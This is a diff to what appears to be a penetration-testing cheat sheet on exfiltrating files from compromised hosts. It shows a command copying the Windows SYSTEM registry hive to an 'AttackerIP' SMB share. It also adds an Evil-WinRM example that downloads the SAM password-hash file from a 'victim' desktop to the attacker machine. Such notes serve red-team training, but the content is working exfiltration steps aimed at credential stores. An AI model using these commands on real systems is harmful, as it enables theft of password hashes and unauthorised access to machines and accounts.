@@ -64,6 +64,17 @@ copy C:\Windows\Repair\SYSTEM \\AttackerIP\kali\
 
 **Note:** The files are stored in the folder where the shell execute the command not in the impacket folder or kali folder. As example, If you execute the command "sudo python3 /opt/impacket/examples/smbserver.py kali ." from the /home/kali/test/ folder, the files will be stored inside.
 
+
+#### Evil-winrm
+Upload a file from the Windows victim machine to the kali attacker machine.
+
+```
+*Evil-WinRM* PS C:\Users\victim\Desktop> download sam
+Info: Downloading C:\Users\victim\Desktop\sam to sam                 
+Info: Download successful!
+```
+
+
 # Linux Methods
 
 #### Curl
